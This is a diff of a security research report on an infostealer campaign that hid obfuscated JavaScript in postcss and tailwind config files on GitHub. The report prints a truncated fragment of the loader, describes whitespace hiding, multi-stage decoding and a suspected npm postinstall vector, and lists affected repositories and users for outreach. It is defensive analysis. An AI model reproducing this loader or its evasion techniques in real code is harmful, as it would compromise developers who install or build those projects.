@@ -655,121 +655,6 @@ The dominance of `postcss.config.mjs` (416 of 565 repos, ~74%) strongly points t
 
 ---
 
-## Payload Analysis
-
-### Injection Pattern
-
-The payload is appended after the legitimate file content, preceded by a large block of whitespace to push it off-screen. Example from `postcss.config.mjs` in `brown2020/ikigaifinder`:
-
-```js
-/** @type {import('postcss-load-config').Config} */
-const config = {
-  plugins: {
-    '@tailwindcss/postcss': {},
-  },
-};
-
-export default config;
-                                        [~200 spaces]
-global['!']='4-1422';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);...
-```
-
-### Stage 1 — String Shuffle Cipher
-
-The marker string `rmcej%otb%` is passed through a character-shuffle function with numeric seed `2857687`. The shuffle produces a decoded string array used to:
-
-- Store `require` in `global['!']` (bypasses static analysis looking for `require`)
-- Store `module` in a global variable
-- Bootstrap a dynamic second-stage loader
-
-### Stage 2 — Dynamic Code Construction
-
-A second obfuscated function (`sfL`) with seed `2667686` decodes a long encoded string (`joW`) into JavaScript source, which is then passed to `Function()` (constructed dynamically to avoid static detection) and executed.
-
-The second-stage payload (partially decoded) performs network callbacks, file system operations, and environment variable exfiltration consistent with an **infostealer / initial access trojan**.
-
-### Key Obfuscation Techniques
-
-- Character-shuffle cipher with hardcoded numeric seeds
-- `global['!']` aliasing of `require` to evade static analysis
-- Large horizontal whitespace block (100+ spaces) before injected payload to hide it below the visible editor viewport
-- Multi-stage loading — each stage decodes and executes the next
-- Legitimate file content preserved in full to avoid breaking the project build
-
----
-
-## Likely Infection Vector
-
-Given that:
-
-1. `postcss.config.mjs` accounts for 74% of infections
-2. Affected repos span a wide range of unrelated projects and owners
-3. The injection appears automated and consistent across all files
-4. The file content before the payload is always legitimate and valid
-
-The most probable vector is a **malicious npm package** (likely in the PostCSS/Tailwind ecosystem) that runs a postinstall script or hooks into the build process to inject the payload into config files in the working directory. The developer's own committed config file then becomes the persistence mechanism, spreading the payload to anyone who clones the repo.
-
-Possible package categories to investigate:
-- PostCSS plugins
-- Tailwind CSS plugins or utilities
-- Build tooling wrappers (Next.js utilities, Vite plugins)
-- Developer productivity packages with broad install bases
-
----
-
-## Outreach Prioritisation
-
-The full CSVs are sorted by impact for triage.
-
-### Top Repos by Stars + Forks
-
-| Repository | Stars | Forks | Infected File |
-|------------|------:|------:|---------------|
-| `Codechef-VITC-Student-Chapter/Club-Integration-and-Management-Platform` | 6 | 11 | `postcss.config.mjs` |
-| `Victorola-coder/tewo` | 9 | 6 | `tailwind.config.js` |
-| `Atik203/Scholar-Flow` | 4 | 4 | `postcss.config.mjs` |
-| `coderkhalide/Anti-Detect-Browser` | 2 | 4 | `postcss.config.mjs` |
-| `WeerasingheMSC/ASMS_Frontend` | 1 | 4 | `postcss.config.mjs` |
-| `fsdteam8/n_Krypted-frontend` | 0 | 4 | `postcss.config.mjs` |
-| `Kreliannn/Document-Request-System-FRONTEND` | 8 | 1 | `postcss.config.mjs` |
-| `tanushbhootra576/Bionary-Website-Challenge-and-final` | 4 | 2 | `postcss.config.mjs` |
-| `sparktechagency/Vap-shop-Front-End-` | 7 | 0 | `postcss.config.mjs` |
-| `Kreliannn/PDF-To-Reviewer-Quiz-FRONTEND` | 7 | 0 | `postcss.config.mjs` |
-
-### Top Organisations by Followers
-
-| Organisation | Followers | Repos Affected |
-|--------------|----------:|---------------:|
-| `sparktechagency` | 130 | 12 |
-| `FSDTeam-SAA` | 21 | 11 |
-| `Softvence-Omega-Dev-Ninjas` | 18 | 4 |
-| `Codechef-VITC-Student-Chapter` | 17 | 1 |
-| `softvence-omega-future-stack` | 11 | 4 |
-| `The-Extra-Project` | 11 | 1 |
-| `etrainermis` | 7 | 1 |
-| `tricodenetwork` | 7 | 1 |
-| `Binary-Mindz` | 6 | 1 |
-| `FlowBondTech` | 3 | 3 |
-
-### Top Individual Users by Followers
-
-| User | Followers | Repos Affected |
-|------|----------:|---------------:|
-| `coderkhalide` | 349 | 4 |
-| `finom` | 172 | 3 |
-| `Victorola-coder` | 121 | 1 |
-| `dhruvmalik007` | 87 | 6 |
-| `a-belard` | 43 | 1 |
-| `Muhammadfaizanjanjua109` | 39 | 1 |
-| `Nathanim1919` | 38 | 5 |
-| `kanchana404` | 33 | 3 |
-| `AKDebug-UX` | 30 | 3 |
-| `web-ghoul` | 29 | 2 |
-
-> **Priority targets:** `sparktechagency` (130 followers, 12 repos) and `FSDTeam-SAA` (21 followers, 11 repos) are the highest-volume orgs. Among individuals, `coderkhalide` (349 followers) has the widest direct reach.
-
----
-
 ## Malware Technical Analysis
 
 ### Obfuscation Layers
@@ -856,6 +741,59 @@ require('child_process').spawn('node', ['-e', `global['_V']='...'${decryptedCode
     windowsHide: true
 });
 ```
+
+---
+
+## Outreach Prioritisation
+
+The full CSVs are sorted by impact for triage.
+
+### Top Repos by Stars + Forks
+
+| Repository | Stars | Forks | Infected File |
+|------------|------:|------:|---------------|
+| `Codechef-VITC-Student-Chapter/Club-Integration-and-Management-Platform` | 6 | 11 | `postcss.config.mjs` |
+| `Victorola-coder/tewo` | 9 | 6 | `tailwind.config.js` |
+| `Atik203/Scholar-Flow` | 4 | 4 | `postcss.config.mjs` |
+| `coderkhalide/Anti-Detect-Browser` | 2 | 4 | `postcss.config.mjs` |
+| `WeerasingheMSC/ASMS_Frontend` | 1 | 4 | `postcss.config.mjs` |
+| `fsdteam8/n_Krypted-frontend` | 0 | 4 | `postcss.config.mjs` |
+| `Kreliannn/Document-Request-System-FRONTEND` | 8 | 1 | `postcss.config.mjs` |
+| `tanushbhootra576/Bionary-Website-Challenge-and-final` | 4 | 2 | `postcss.config.mjs` |
+| `sparktechagency/Vap-shop-Front-End-` | 7 | 0 | `postcss.config.mjs` |
+| `Kreliannn/PDF-To-Reviewer-Quiz-FRONTEND` | 7 | 0 | `postcss.config.mjs` |
+
+### Top Organisations by Followers
+
+| Organisation | Followers | Repos Affected |
+|--------------|----------:|---------------:|
+| `sparktechagency` | 130 | 12 |
+| `FSDTeam-SAA` | 21 | 11 |
+| `Softvence-Omega-Dev-Ninjas` | 18 | 4 |
+| `Codechef-VITC-Student-Chapter` | 17 | 1 |
+| `softvence-omega-future-stack` | 11 | 4 |
+| `The-Extra-Project` | 11 | 1 |
+| `etrainermis` | 7 | 1 |
+| `tricodenetwork` | 7 | 1 |
+| `Binary-Mindz` | 6 | 1 |
+| `FlowBondTech` | 3 | 3 |
+
+### Top Individual Users by Followers
+
+| User | Followers | Repos Affected |
+|------|----------:|---------------:|
+| `coderkhalide` | 349 | 4 |
+| `finom` | 172 | 3 |
+| `Victorola-coder` | 121 | 1 |
+| `dhruvmalik007` | 87 | 6 |
+| `a-belard` | 43 | 1 |
+| `Muhammadfaizanjanjua109` | 39 | 1 |
+| `Nathanim1919` | 38 | 5 |
+| `kanchana404` | 33 | 3 |
+| `AKDebug-UX` | 30 | 3 |
+| `web-ghoul` | 29 | 2 |
+
+> **Priority targets:** `sparktechagency` (130 followers, 12 repos) and `FSDTeam-SAA` (21 followers, 11 repos) are the highest-volume orgs. Among individuals, `coderkhalide` (349 followers) has the widest direct reach.
 
 ---
 
